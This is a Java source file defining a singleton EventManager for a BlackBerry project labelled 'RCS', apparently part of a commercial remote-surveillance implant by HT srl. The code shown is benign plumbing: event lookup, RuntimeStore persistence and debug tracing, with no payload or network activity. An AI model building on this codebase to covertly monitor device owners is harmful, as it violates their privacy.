//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : EventManager.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry;

import java.util.Vector;

import net.rim.device.api.system.RuntimeStore;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.event.Event;
import blackberry.interfaces.Singleton;
import blackberry.threadpool.TimerJob;
import blackberry.utils.Check;

// TODO: Auto-generated Javadoc
/**
 * The Class EventManager.
 */
public final class EventManager extends Manager implements Singleton {

    private static final long GUID = 0x3c80b0de21f15f46L;

    /** The debug instance. */
    //#ifdef DEBUG
    private static Debug debug = new Debug("EventManager", DebugLevel.VERBOSE);
    //#endif

    /** The instance. */
    private static EventManager instance = null;

    /**
     * Gets the single instance of EventManager.
     * 
     * @return single instance of EventManager
     */
    public static synchronized EventManager getInstance() {
        if (instance == null) {
            instance = (EventManager) RuntimeStore.getRuntimeStore().get(GUID);
            if (instance == null) {
                final EventManager singleton = new EventManager();
                RuntimeStore.getRuntimeStore().put(GUID, singleton);
                instance = singleton;
            }

        }

        return instance;
    }

    /**
     * Instantiates a new event manager.
     */
    private EventManager() {
        super();
        //#ifdef DEBUG
        debug.trace("EventManager");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see blackberry.Manager#getAllItems()
     */
    public Vector getAllItems() {
        final Vector events = statusObj.getEventsList();
        return events;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.Manager#getItem(int)
     */
    public TimerJob getItem(final int id) {
        final Event event = statusObj.getEvent(id);
        //#ifdef DBC
        Check.ensures(event.eventId == id, "Wrong id");
        //#endif
        return event;
    }

}
